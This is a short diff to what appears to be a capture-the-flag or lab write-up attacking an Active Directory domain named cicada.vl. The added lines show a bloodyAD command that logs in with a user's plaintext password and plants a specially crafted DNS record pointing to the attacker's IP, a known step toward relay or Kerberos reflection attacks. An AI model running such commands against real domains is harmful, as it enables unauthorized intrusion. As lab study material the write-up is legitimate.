@@ -292,5 +292,13 @@ Certificate Authorities
 Certificate Templates                   : [!] Could not find any certificate templates
 ```
 
+
 ```python
+bloodyAD -u Rosie.Powell -p 'Cicada123' -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.15.69
+[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
+```
+First ill add a DNS record with my IP address.
+
+```python
+
 ```
